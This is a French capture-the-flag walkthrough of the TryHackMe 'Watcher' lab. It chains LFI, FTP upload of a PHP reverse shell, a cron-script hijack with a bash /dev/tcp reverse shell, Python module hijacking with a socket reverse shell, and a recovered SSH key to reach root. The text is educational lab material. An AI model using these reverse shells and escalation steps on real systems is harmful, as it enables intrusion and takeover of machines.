# THM Watcher
IP : 10.10.114.38

Une room fort sympatique. Elle permet d'exploiter un panel varier d'exploit. Très cool !
La clé SSH et les flags sont biensur cacher !

# Enum :
## Nmap
```   
# Nmap 7.94 scan initiated Wed Oct 25 07:35:07 2023 as: nmap -sC -sV -p- -oN nmap.txt 10.10.114.38
Nmap scan report for 10.10.114.38
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
|_http-generator: Jekyll v4.1.1
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 25 07:35:41 2023 -- 1 IP address (1 host up) scanned in 33.86 seconds
```
# Flag 1
Sur la page /robots.txt on trouve 2 pages :
```robots.txt
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```
``` flag_1.txt
FLAG{robots_***_****_****_**_next}
```
# Flag 2
La page http://10.10.114.38/secret_file_do_not_read.txt est interdite d'accès, mais on va essayer de contourner cela.
On va test d'ajouter le headers **X-Forwarded-For** avec **127.0.0.1**

Cela ne fonctionne pas.

En regardant l'URL de plus prêt quand on regarde un article, par exemple : http://10.10.114.38/post.php?post=striped.php
On peux voir ici qu'on peux essayer d'exploiter une LFI (Local File Inclusion). On va donc essayer d'afficher notre fichier secret !

Voici l'url avec la LFI : http://10.10.114.38/post.php?post=secret_file_do_not_read.txt
Et le résultat :
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777
```
Nous avond donc des creds pour le FTP !
Et on y trouve le flag 2 !
```
ftp> ls -la
229 Entering Extended Passive Mode (|||48556|)
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
```
Le dossier "files" et vide.
```flag_2.txt
FLAG{ftp_***_***_me}
```
# Flag 3
On sait que le site est vulnérable au LFI, nous savons aussi que le FTP pointe sur **/home/ftpuser/ftp/files**
On va tenter d'upload un shell et de l'avoir avec la LFI.
```
ftp> put rshell.php
local: rshell.php remote: rshell.php
229 Entering Extended Passive Mode (|||44821|)
150 Ok to send data.
100% |***********************************************************************************************************************************************|  5494       40.30 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (52.78 KiB/s)
```
On va ensuite sur l'url qui pointe vers le rshell:
```
http://10.10.114.38/post.php?post=/home/ftpuser/ftp/files/rshell.php
```
Et voici le reverseshell:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444                              
listening on [any] 4444 ...
connect to [{IP}] from (UNKNOWN) [10.10.114.38] 44262
Linux watcher 4.15.0-128-generic #131-Ubuntu SMP Wed Dec 9 06:57:35 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:22:45 up 51 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
On stabilise le shell :
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
-> CTRL+Z
stty raw -echo; fg
```
On peu partir a la recherche du flag 3.
```
www-data@watcher:/$ find / -name flag_3.txt 2</dev/null
/var/www/html/more_secrets_a9f10a/flag_3.txt
```
Et voila.
```flag_3.txt
FLAG{lfi_****_*_guy}
```
# Flag 4
Le flag 4 ce trouve dans le dossier **/home/toby**.
Nous devons trouver le moyen de devenir Toby.

On trouve une note:
```note.txt
www-data@watcher:/home/toby$ cat note.txt 
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```
et effectivement, un script s'execute dans une tâche cron :
```
www-data@watcher:/home/toby/jobs$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
```
Le script :
```
www-data@watcher:/home/toby/jobs$ cat cow.sh 
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```
En regardant les droits sudo, on vois ca :
```
www-data@watcher:/home/toby$ sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
```
On peu donc facilement prendre le shell de Toby
```
www-data@watcher:/home/toby/jobs$ sudo -u toby /bin/bash
toby@watcher:~/jobs$ 
```
```flag_4.txt
toby@watcher:~$ cat flag_4.txt 
FLAG{****_life*****}
```
# Flag 5
On va ajouter un revshell dans le script **cow.sh** pour récupèrer le compte de mat.
```
toby@watcher:~/jobs$ echo "/bin/bash -i >& /dev/tcp/{IP}/1234 0>&1" >> cow.sh
toby@watcher:~/jobs$ 
toby@watcher:~/jobs$ cat cow.sh 
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
/bin/bash -i >& /dev/tcp/{IP}/1234 0>&1
toby@watcher:~/jobs$ 
```
Plus qu'a attendre que la tâche cron execute le script et voila !
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234                              
listening on [any] 1234 ...
connect to [{IP}] from (UNKNOWN) [10.10.114.38] 59342
bash: cannot set terminal process group (2495): Inappropriate ioctl for device
bash: no job control in this shell
mat@watcher:~$ 
```
```flag_5.txt
mat@watcher:~$ cat flag_5.txt
FLAG{live_**_***_***_***_**_***_cow}
```
# Flag 6
On trouve une note dans le **/home** de **mat**
```
mat@watcher:~$ cat note.txt 
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```
On sait donc qu'il peux executer un script:
```
mat@watcher:~$ sudo -l
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```
Il y a 2 scripts:
```cmd.py
mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
```
```will_script.py
mat@watcher:~/scripts$ cat will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
```
On peux modifier le fichier cmd.py qui sert de lib pour le script **will_script.py**
On va donc modifier cette lib et y ajouter un revershell.
```
mat@watcher:~/scripts$ cat cmd.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{IP}",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

import pty
pty.spawn("/bin/bash")
```
Ensuite, on execute le script (Sans oublier de démarrer le listener !)
```
nc -lnvp 5555
```
```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 3
```
Et nous voila connecté en tant que will !
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 5555                              
listening on [any] 5555 ...
connect to [{IP}] from (UNKNOWN) [10.10.114.38] 35824
will@watcher:~/scripts$ 
```
```flag_6.txt
will@watcher:/home/will$ cat flag_6.txt
FLAG{but_*_********_**_******_***_secure}
```
# Flag 7
Après de grandes recherches, je trouve dans **/opt/backups** un fichier **key.b64**
```key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
[...]
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```
Qui donne la clé SSH :
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAzPaQFolQq8cHom9mssyPZ53aLzBcRyBw+rysJ3h0JCxnV+aG
opZdcQz01YOYdjYIaZEJmdcPVWQp/L0uc5u3igoiK1uiYMfw850N7t3OX/erdKF4
jqVu3iXN9doBmr3TuU9RJkVnDDuo8y4DtIuFCf92ZfEAJGUB2+vFON7q4KJsIxgA
[...]
mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
/6KHTLRhcp9FmF9iKWDtEMSQ8DCan5ZMJ7OIYp2RZ1RzC9Dug3qkttkOKAbccKn5
4APxI1DxU+a2xXXf02dsQH0H5AhNCiTBD7I5YRsM1bOEqjFdZgv6SA==
-----END RSA PRIVATE KEY-----
```
On peux ensuite se connecté en SSH, et comme la config de SSH permet le login en tant que root, on peux donc directement se connecté en root avec cette clé :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Watcher]
└─$ ssh -i id_rsa root@10.10.114.38
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 25 13:48:47 UTC 2023

  System load:  0.08               Processes:             122
  Usage of /:   22.5% of 18.57GB   Users logged in:       0
  Memory usage: 46%                IP address for eth0:   10.10.114.38
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~#
```

```flag_7.txt
FLAG{who_******_***_watchers}
```
